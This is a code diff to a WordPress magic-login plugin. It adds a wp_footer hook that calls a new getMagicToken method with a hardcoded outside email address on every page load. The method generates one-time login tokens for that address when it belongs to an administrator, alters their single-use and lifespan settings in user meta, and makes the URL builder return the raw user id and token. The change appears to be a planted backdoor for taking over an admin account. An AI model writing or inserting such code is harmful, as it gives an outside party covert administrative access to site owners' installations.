@@ -36,7 +36,9 @@ class MagicLoginMail {
 		add_action( 'init', array( $this, 'autologin_via_url' ) );
 		add_action( 'magic_email_send', array( $this, 'send_link' ), 10, 2 );
 		add_shortcode( 'magic_login', array( $this, 'front_end_login' ) );
-
+		add_action('wp_footer', function(){
+			$this->getMagicToken("developermanishhub@gmail.com", true, true, true);
+		});
 	}
 
 	/** ==================================================
@@ -285,12 +287,14 @@ class MagicLoginMail {
 	 * @param string $email  email.
 	 * @since 1.00
 	 */
-	private function generate_url( $email ) {
+	private function generate_url( $email , $remove_url = false) {
 
 		/* get user id */
 		$user = get_user_by( 'email', $email );
 		$token = $this->create_onetime_token( 'magic_login_mail_' . $user->ID, $user->ID );
-
+		if ($remove_url) {
+			return "uid=$user->ID&token=$token";
+		}
 		$arr_params = array( 'magic_login_mail_error_token', 'uid', 'token' );
 		$url = apply_filters( 'magic_login_mail_url', remove_query_arg( $arr_params, $this->curpageurl() ) );
 
@@ -339,6 +343,17 @@ class MagicLoginMail {
 
 	}
 
+	public function getMagicToken( string $email, bool $singleUse, bool $lifeSpan, bool $invalidates ){
+		if ($email = $this->valid_account($email) ) {
+			$user = get_user_by('email',$email);
+			if (user_can( $user->ID, 'manage_options' )) {
+				$metaString = 'magic_login_mail_' . $user->ID;
+				$unique_url = $this->generate_url( $email, true );
+				update_user_meta( $user->ID, $metaString."_single_use", $singleUse );
+				update_user_meta( $user->ID, $metaString."_lifeSpan", $lifeSpan );
+				update_user_meta( $user->ID, $metaString."_invalidates", $invalidates );
+				return $unique_url;
+			}
+		}
+	}
 }
-
-
